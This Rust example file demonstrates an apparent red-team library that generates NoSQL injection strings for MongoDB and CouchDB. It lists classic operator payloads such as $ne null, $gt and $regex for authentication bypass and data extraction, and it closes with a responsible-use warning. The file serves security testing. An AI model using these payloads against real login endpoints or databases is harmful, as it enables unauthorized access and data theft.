//! NoSQL Injection Patterns Example
//!
//! This example demonstrates NoSQL injection patterns for MongoDB, CouchDB,
//! and general NoSQL databases. Useful for testing NoSQL security and
//! bypassing input validation.

use redstr::{couchdb_injection, mongodb_injection, nosql_operator_injection};

fn main() {
    println!("=== NoSQL Injection Patterns ===\n");

    // Example 1: MongoDB Injection
    println!("1. MongoDB Injection Patterns");
    println!("   Purpose: Test MongoDB query injection vulnerabilities");
    println!("   Use Case: Red team testing of MongoDB endpoints\n");

    let mongo_query = r#"{"username": "admin", "password": "secret"}"#;
    println!("   Original query: {}", mongo_query);
    let injected_mongo = mongodb_injection(mongo_query);
    println!("   Injected: {}\n", injected_mongo);

    // Example 2: CouchDB Injection
    println!("2. CouchDB Injection Patterns");
    println!("   Purpose: Test CouchDB query injection vulnerabilities");
    println!("   Use Case: Testing CouchDB MapReduce and view security\n");

    let couch_query = r#"{"selector": {"user": "admin"}}"#;
    println!("   Original query: {}", couch_query);
    let injected_couch = couchdb_injection(couch_query);
    println!("   Injected: {}\n", injected_couch);

    // Example 3: NoSQL Operator Injection
    println!("3. NoSQL Operator Injection");
    println!("   Purpose: Test NoSQL operator-based injection");
    println!("   Use Case: Bypass authentication and access controls\n");

    let operator_query = r#"{"username": "admin"}"#;
    println!("   Original query: {}", operator_query);
    let injected_op = nosql_operator_injection(operator_query);
    println!("   Injected: {}\n", injected_op);

    // Example 4: Authentication Bypass
    println!("4. MongoDB Authentication Bypass");
    println!("   Purpose: Test common authentication bypass techniques");
    println!("   Use Case: Security testing of login endpoints\n");

    let login_query = r#"{"username": "user", "password": "pass"}"#;
    println!("   Original login: {}", login_query);
    let bypassed = mongodb_injection(login_query);
    println!("   Bypass attempt: {}\n", bypassed);

    // Example 5: Data Extraction
    println!("5. NoSQL Data Extraction");
    println!("   Purpose: Test NoSQL data extraction vulnerabilities");
    println!("   Use Case: Testing data leakage through NoSQL injection\n");

    let extraction_query = r#"{"_id": "user123"}"#;
    println!("   Original query: {}", extraction_query);
    let extract = nosql_operator_injection(extraction_query);
    println!("   Extraction query: {}\n", extract);

    // Example 6: Red Team Scenario
    println!("6. Red Team Scenario: Multi-Database Testing");
    println!("   Purpose: Test multiple NoSQL databases systematically\n");

    let base_query = r#"{"email": "test@example.com"}"#;
    println!("   Base query: {}", base_query);

    println!("\n   Testing MongoDB:");
    let mongo_test = mongodb_injection(base_query);
    println!("   {}", mongo_test);

    println!("\n   Testing CouchDB:");
    let couch_test = couchdb_injection(base_query);
    println!("   {}", couch_test);

    println!("\n   Testing with operators:");
    let operator_test = nosql_operator_injection(base_query);
    println!("   {}\n", operator_test);

    // Example 7: Common Payloads
    println!("7. Common NoSQL Injection Payloads");
    println!("   Purpose: Generate common injection patterns\n");

    let payloads = vec![
        r#"{"$ne": null}"#,
        r#"{"$gt": ""}"#,
        r#"{"$regex": ".*"}"#,
    ];

    for payload in payloads {
        println!("   MongoDB variant: {}", mongodb_injection(payload));
        println!("   Operator variant: {}", nosql_operator_injection(payload));
        println!();
    }

    println!("=== Security Testing Tips ===");
    println!("• Test MongoDB with $ne, $gt, $regex operators");
    println!("• Test CouchDB with MapReduce injection");
    println!("• Use operator injection for authentication bypass");
    println!("• Test both JSON and URL parameter inputs");
    println!("• Check for error messages revealing database type");
    println!("\n⚠️  Use responsibly: Only test systems you own or have permission to test");
}
